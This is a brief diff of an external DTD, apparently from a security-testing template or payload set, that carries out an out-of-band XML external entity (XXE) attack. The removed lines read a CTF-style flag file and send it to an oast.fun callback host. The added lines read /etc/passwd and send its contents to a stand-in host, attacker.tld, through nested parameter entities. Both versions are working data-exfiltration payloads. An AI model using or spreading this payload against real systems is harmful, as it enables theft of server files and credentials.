@@ -1,5 +1,4 @@
-<!ENTITY % file SYSTEM "file:///tmp/xml/flag.txt">
-<!ENTITY % eval "<!ENTITY exfiltrate SYSTEM 'http://dbndbnrdbqttnejtwjkv9152708nz4ybg.oast.fun/?data=%file;'>">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.tld/?leak=%file;'>">
 %eval;
-%exfiltrate;
-
+%exfil;
